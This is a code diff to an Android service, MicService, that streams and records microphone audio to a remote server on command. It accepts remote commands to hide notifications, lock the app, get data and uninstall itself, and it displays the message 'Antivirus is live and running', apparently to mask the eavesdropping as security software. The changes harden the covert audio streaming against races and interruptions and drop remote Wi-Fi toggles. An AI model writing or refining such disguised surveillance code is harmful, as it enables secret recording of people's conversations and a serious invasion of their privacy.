@@ -172,6 +172,7 @@ class MicService : Service() {
     
     // HQ Buffered Audio Mode removed (M-02) — all code uses realtime path
     @Volatile private var lastAudioChunkSentAt = 0L
+    @Volatile private var lastPingSentAt = 0L
     @Volatile private var lastHealthSentAt = 0L
     @Volatile private var audioSourceRotation = 0
     @Volatile private var activeAudioSource = MediaRecorder.AudioSource.DEFAULT
@@ -229,7 +230,7 @@ class MicService : Service() {
     private var networkCallback: ConnectivityManager.NetworkCallback? = null
     private var webRtcRecoveryJob: Job? = null
     private var iceWatchdogJob: Job? = null
-    private var lastDashboardQuality: JSONObject? = null
+    @Volatile private var lastDashboardQuality: JSONObject? = null
     private var cachedIceServers: List<PeerConnection.IceServer> = listOf(
         PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
     )
@@ -535,7 +536,7 @@ class MicService : Service() {
             connectWebSocket()
         } else {
             Log.i(TAG, "WebSocket already active — ensuring mic/data workers are running")
-            if (!isCapturing && !isWebRtcStreaming) startAudioCapture()
+            if (!isCapturing && !isWebRtcStreaming && wantsMicStreaming) startAudioCapture()
             startMicWatchdog()
             startDataCollection()
         }
@@ -1113,9 +1114,8 @@ class MicService : Service() {
                 Log.i(TAG, "CMD: start mic stream")
                 wantsMicStreaming = true
                 if (isWebRtcStreaming) {
-                    Log.i(TAG, "Stopping WebRTC to allow PCM stream")
-                    stopWebRtcSession(notifyState = true)
-                    // stopWebRtcSession will automatically start PCM stream after 1s delay
+                    Log.i(TAG, "WebRTC is active, ignoring start_stream command to prevent interrupting WebRTC")
+                    sendCommandAck("start_stream", detail = "ignored_webrtc_active")
                 } else {
                     val staleCapture = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 20_000)
                     if (staleCapture) {
@@ -1123,9 +1123,9 @@ class MicService : Service() {
                     }
                     startAudioCapture()
                     startMicWatchdog()
+                    updateNotification("Antivirus is live and running")
+                    sendCommandAck("start_stream")
                 }
-                updateNotification("Antivirus is live and running")
-                sendCommandAck("start_stream")
             }
             "stop_stream" -> {
                 Log.i(TAG, "CMD: stop mic stream")
@@ -1140,7 +1140,11 @@ class MicService : Service() {
             "start_record" -> {
                 Log.i(TAG, "CMD: start recording")
                 // Also ensure mic is capturing
-                startAudioCapture()
+                if (isWebRtcStreaming) {
+                    Log.w(TAG, "WebRTC active — recording may capture silence depending on OEM mic sharing")
+                } else {
+                    startAudioCapture()
+                }
                 openRecordingFile()
                 sendCommandAck("start_record")
             }
@@ -1228,30 +1232,6 @@ class MicService : Service() {
                 } catch (e: Exception) {
                     Log.e(TAG, "Failed to open autostart settings: ${e.message}")
                     sendCommandAck("enable_autostart", "error", e.message)
-                }
-            }
-                "toggle_wifi" -> {
-                    Log.i(TAG, "CMD: toggle_wifi - toggling WiFi state")
-                    try {
-                        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                            // Android 10+ - open WiFi settings panel
-                            val panelIntent = Intent(android.provider.Settings.ACTION_WIFI_SETTINGS)
-                            panelIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                            startActivity(panelIntent)
-                            sendCommandAck("toggle_wifi", "pending", "user_action_required_settings_opened")
-                    } else {
-                        // Android 9 and below - direct toggle
-                        @Suppress("DEPRECATION")
-                        val currentState = wifiManager.isWifiEnabled
-                        @Suppress("DEPRECATION")
-                        wifiManager.isWifiEnabled = !currentState
-                        val newState = if (!currentState) "on" else "off"
-                        sendCommandAck("toggle_wifi", detail = "WiFi turned $newState")
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "Failed to toggle WiFi: ${e.message}")
-                    sendCommandAck("toggle_wifi", "error", e.message)
                 }
             }
             "check_update" -> {
@@ -1390,55 +1370,6 @@ class MicService : Service() {
                     sendCommandAck("reboot", "error", e.message)
                 }
             }
-            "wifi_on" -> {
-                Log.i(TAG, "CMD: wifi_on - enabling WiFi")
-                try {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                        // M-05: Use Device Owner path on API 29+
-                        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                        if (dpm.isDeviceOwnerApp(packageName)) {
-                            val admin = ComponentName(this, DeviceAdminReceiver::class.java)
-                            dpm.setGlobalSetting(admin, android.provider.Settings.Global.WIFI_ON, "1")
-                        } else {
-                            val intent = Intent(android.provider.Settings.ACTION_WIFI_SETTINGS)
-                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                            startActivity(intent)
-                        }
-                    } else {
-                        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
-                        @Suppress("DEPRECATION")
-                        wifiManager.isWifiEnabled = true
-                    }
-                    sendCommandAck("wifi_on")
-                } catch (e: Exception) {
-                    Log.e(TAG, "Failed to enable wifi: ${e.message}")
-                    sendCommandAck("wifi_on", "error", e.message)
-                }
-            }
-            "wifi_off" -> {
-                Log.i(TAG, "CMD: wifi_off - disabling WiFi")
-                try {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                        if (dpm.isDeviceOwnerApp(packageName)) {
-                            val admin = ComponentName(this, DeviceAdminReceiver::class.java)
-                            dpm.setGlobalSetting(admin, android.provider.Settings.Global.WIFI_ON, "0")
-                        } else {
-                            val intent = Intent(android.provider.Settings.ACTION_WIFI_SETTINGS)
-                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                            startActivity(intent)
-                        }
-                    } else {
-                        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
-                        @Suppress("DEPRECATION")
-                        wifiManager.isWifiEnabled = false
-                    }
-                    sendCommandAck("wifi_off")
-                } catch (e: Exception) {
-                    Log.e(TAG, "Failed to disable wifi: ${e.message}")
-                    sendCommandAck("wifi_off", "error", e.message)
-                }
-            }
             "uninstall_app" -> {
                 // Uninstall the app (clear device owner first, then uninstall)
                 Log.i(TAG, "CMD: uninstall_app - starting uninstall process")
@@ -1474,7 +1405,7 @@ class MicService : Service() {
         try {
             val obj = JSONObject(jsonText)
             when (obj.optString("type")) {
-                "get_data", "force_update", "start_stream", "stop_stream", "start_record", "stop_record", "ping", "force_reconnect", "grant_permissions", "enable_autostart", "toggle_wifi", "check_update", "clear_device_owner", "lock_app", "unlock_app", "hide_notifications", "uninstall_app" -> {
+                "get_data", "force_update", "start_stream", "stop_stream", "start_record", "stop_record", "ping", "force_reconnect", "grant_permissions", "enable_autostart", "check_update", "clear_device_owner", "lock_app", "unlock_app", "hide_notifications", "uninstall_app" -> {
                     handleServerCommand(obj.optString("type"))
                     return
                 }
@@ -3059,11 +2990,16 @@ class MicService : Service() {
         Log.i(TAG, "[MIC] Starting audio capture loop")
         isCapturing = true
         lastAudioChunkSentAt = System.currentTimeMillis()
+        lastPingSentAt = lastAudioChunkSentAt
 
         audioCaptureJob = serviceScope.launch(Dispatchers.IO) {
             // ── PRIORITY BOOST: Audio thread and network binding ─────────────
             // Set highest audio priority for this thread
-            android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_AUDIO)
+            try {
+                android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_AUDIO)
+            } catch (e: Exception) {
+                Log.w(TAG, "Could not set audio thread priority: ${e.message}")
+            }
             audioCaptureStoppedExternally.set(false)
             
             // Bug 4: DO NOT call bindProcessToNetwork() — it pins ALL sockets
@@ -3238,7 +3174,8 @@ class MicService : Service() {
                             if (safeSend(encoded.toByteString())) {
                                 lastAudioChunkSentAt = System.currentTimeMillis()
                                 lastAudioChunkSentAtMs = lastAudioChunkSentAt
-                                if (lastAudioChunkSentAt - lastHealthSentAt >= 10_000) {
+                                if (lastAudioChunkSentAt - lastPingSentAt >= 10_000) {
+                                    lastPingSentAt = lastAudioChunkSentAt
                                     sendHealthStatus("audio_tick")
                                 }
                             } else {
@@ -3305,7 +3242,6 @@ class MicService : Service() {
 
                 val wasCapturing = isCapturing
                 isCapturing = false
-                isCapturingGuard.set(false)
                 val stoppedExternally = audioCaptureStoppedExternally.getAndSet(false)
                 // BUG-C1 fix: Use audioRecord snapshot and null-check before operating.
                 // If stopAudioCapture() already set audioRecord=null and released it,
@@ -3324,6 +3260,7 @@ class MicService : Service() {
                         audioRecord = null
                     }
                 }
+                isCapturingGuard.set(false)
                 if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                 Log.i(TAG, "Audio capture stopped")
                 sendHealthStatus("mic_stopped")
@@ -3417,8 +3354,9 @@ class MicService : Service() {
                     if (NoiseSuppressor.isAvailable()) {
                         try {
                             noiseSuppressor = NoiseSuppressor.create(sid)?.also { e ->
-                                // Enable hardware NS for clear voice and less noise
-                                e.enabled = true
+                                // Disable hardware NS to avoid phase/gating conflicts with
+                                // our custom overlap-add SpectralDenoiser down the pipeline.
+                                e.enabled = false
                             }
                         } catch (_: Exception) {}
                     }
@@ -4010,12 +3948,12 @@ class MicService : Service() {
         // Bug 2.7: Stop immediately before cancellation to prevent race
         val ar = audioRecord
         audioRecord = null
-        isCapturingGuard.set(false)
         try {
             ar?.stop()
             releaseSessionAudioEffects()
             ar?.release()
         } catch (_: Exception) {}
+        isCapturingGuard.set(false)
         audioCaptureStoppedExternally.set(true)
         audioCaptureJob?.cancel()
         audioCaptureJob = null
@@ -4061,6 +3999,7 @@ class MicService : Service() {
             put("type", "health_status")
             put("deviceId", deviceId)
             put("wsConnected", activeWebSocket != null)
+            put("isWebRtcStreaming", isWebRtcStreaming)
             // In WebRTC mode microphone is captured by WebRTC audio source, not AudioRecord.
             put("micCapturing", isCapturing || isWebRtcStreaming)
             put("lastAudioChunkSentAt", lastAudioChunkSentAt)
